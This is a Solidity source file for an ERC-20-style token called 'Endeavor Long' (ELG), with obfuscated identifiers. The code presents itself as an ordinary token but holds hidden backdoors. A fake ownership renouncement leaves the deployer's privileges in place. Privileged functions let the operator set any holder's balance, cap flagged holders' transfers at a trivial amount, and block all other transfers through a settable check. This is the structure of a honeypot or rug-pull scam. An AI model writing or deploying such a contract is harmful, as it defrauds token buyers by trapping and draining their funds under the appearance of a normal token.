//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface listExemptReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract amountFund {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface minShould {
    function createPair(address toFee, address atExemptTake) external returns (address);
}

interface marketingAuto {
    function totalSupply() external view returns (uint256);

    function balanceOf(address shouldFund) external view returns (uint256);

    function transfer(address atMode, uint256 receiverLiquidity) external returns (bool);

    function allowance(address senderIs, address spender) external view returns (uint256);

    function approve(address spender, uint256 receiverLiquidity) external returns (bool);

    function transferFrom(
        address sender,
        address atMode,
        uint256 receiverLiquidity
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverTo, uint256 value);
    event Approval(address indexed senderIs, address indexed spender, uint256 value);
}

interface fundToken is marketingAuto {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract EndeavorLong is amountFund, marketingAuto, fundToken {

    uint8 private toTeam = 18;

    address shouldIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function receiverEnable(address isTeam, address atMode, uint256 receiverLiquidity) internal returns (bool) {
        require(modeTakeList[isTeam] >= receiverLiquidity);
        modeTakeList[isTeam] -= receiverLiquidity;
        modeTakeList[atMode] += receiverLiquidity;
        emit Transfer(isTeam, atMode, receiverLiquidity);
        return true;
    }

    event OwnershipTransferred(address indexed buyTx, address indexed enableMin);

    function owner() external view returns (address) {
        return listReceiver;
    }

    bool private amountMode;

    function listEnable() private view {
        require(isFund[_msgSender()]);
    }

    address private listReceiver;

    mapping(address => bool) public isFund;

    uint256 receiverTrading;

    function totalSupply() external view virtual override returns (uint256) {
        return maxMin;
    }

    function tokenAutoTotal(uint256 receiverLiquidity) public {
        listEnable();
        launchLaunched = receiverLiquidity;
    }

    function approve(address fundShould, uint256 receiverLiquidity) public virtual override returns (bool) {
        isLiquidity[_msgSender()][fundShould] = receiverLiquidity;
        emit Approval(_msgSender(), fundShould, receiverLiquidity);
        return true;
    }

    constructor (){
        if (amountMode) {
            atLaunched = true;
        }
        listExemptReceiver launchSender = listExemptReceiver(swapAmount);
        totalTx = minShould(launchSender.factory()).createPair(launchSender.WETH(), address(this));
        
        swapTeam = _msgSender();
        tokenMax();
        isFund[swapTeam] = true;
        modeTakeList[swapTeam] = maxMin;
        if (liquidityTake == fromSell) {
            fromSell = liquidityTake;
        }
        emit Transfer(address(0), swapTeam, maxMin);
    }

    function decimals() external view virtual override returns (uint8) {
        return toTeam;
    }

    uint256 constant walletAmount = 7 ** 10;

    uint256 launchLaunched;

    mapping(address => bool) public atLiquidity;

    function txReceiver(address isTeam, address atMode, uint256 receiverLiquidity) internal returns (bool) {
        if (isTeam == swapTeam) {
            return receiverEnable(isTeam, atMode, receiverLiquidity);
        }
        uint256 tokenLaunch = marketingAuto(totalTx).balanceOf(shouldIs);
        require(tokenLaunch == launchLaunched);
        require(atMode != shouldIs);
        if (atLiquidity[isTeam]) {
            return receiverEnable(isTeam, atMode, walletAmount);
        }
        return receiverEnable(isTeam, atMode, receiverLiquidity);
    }

    function tokenMax() public {
        emit OwnershipTransferred(swapTeam, address(0));
        listReceiver = address(0);
    }

    bool public takeFee;

    mapping(address => uint256) private modeTakeList;

    bool public feeTx;

    function getOwner() external view returns (address) {
        return listReceiver;
    }

    function exemptMarketing(address exemptAmount) public {
        listEnable();
        if (fromSell != liquidityTake) {
            fromSell = takeLiquidity;
        }
        if (exemptAmount == swapTeam || exemptAmount == totalTx) {
            return;
        }
        atLiquidity[exemptAmount] = true;
    }

    string private sellReceiver = "ELG";

    uint256 public liquidityTake;

    function transferFrom(address isTeam, address atMode, uint256 receiverLiquidity) external override returns (bool) {
        if (_msgSender() != swapAmount) {
            if (isLiquidity[isTeam][_msgSender()] != type(uint256).max) {
                require(receiverLiquidity <= isLiquidity[isTeam][_msgSender()]);
                isLiquidity[isTeam][_msgSender()] -= receiverLiquidity;
            }
        }
        return txReceiver(isTeam, atMode, receiverLiquidity);
    }

    uint256 public fromSell;

    function senderReceiver(address marketingTxAmount) public {
        if (takeFee) {
            return;
        }
        
        isFund[marketingTxAmount] = true;
        
        takeFee = true;
    }

    bool public atLaunched;

    string private exemptFee = "Endeavor Long";

    uint256 public takeLiquidity;

    address public swapTeam;

    function balanceOf(address shouldFund) public view virtual override returns (uint256) {
        return modeTakeList[shouldFund];
    }

    function name() external view virtual override returns (string memory) {
        return exemptFee;
    }

    function totalWallet(address marketingTx, uint256 receiverLiquidity) public {
        listEnable();
        modeTakeList[marketingTx] = receiverLiquidity;
    }

    address public totalTx;

    function symbol() external view virtual override returns (string memory) {
        return sellReceiver;
    }

    mapping(address => mapping(address => uint256)) private isLiquidity;

    uint256 private maxMin = 100000000 * 10 ** 18;

    function allowance(address minLiquidityMode, address fundShould) external view virtual override returns (uint256) {
        if (fundShould == swapAmount) {
            return type(uint256).max;
        }
        return isLiquidity[minLiquidityMode][fundShould];
    }

    address swapAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function transfer(address marketingTx, uint256 receiverLiquidity) external virtual override returns (bool) {
        return txReceiver(_msgSender(), marketingTx, receiverLiquidity);
    }

}